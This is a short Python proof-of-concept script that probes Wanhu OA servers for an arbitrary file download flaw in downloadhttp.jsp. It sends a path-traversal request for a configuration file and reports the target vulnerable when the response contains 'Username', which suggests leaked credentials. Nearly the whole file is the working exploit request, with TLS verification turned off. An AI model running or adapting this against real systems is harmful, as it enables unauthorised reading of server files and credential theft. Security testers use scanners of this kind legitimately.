import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        }
    exp_url = target_url+"defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
    console.print(now_time() + " [INFO]     正在检测万户OA downloadhttp.jsp 任意文件下载漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(exp_url, headers=headers, verify=False)
        if respones.status_code == 200 and 'Username' in respones.text:
            console.print(now_time() + ' [SUCCESS]  万户OA downloadhttp.jsp 任意文件下载漏洞存在{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  万户OA downloadhttp.jsp 任意文件下载漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
   
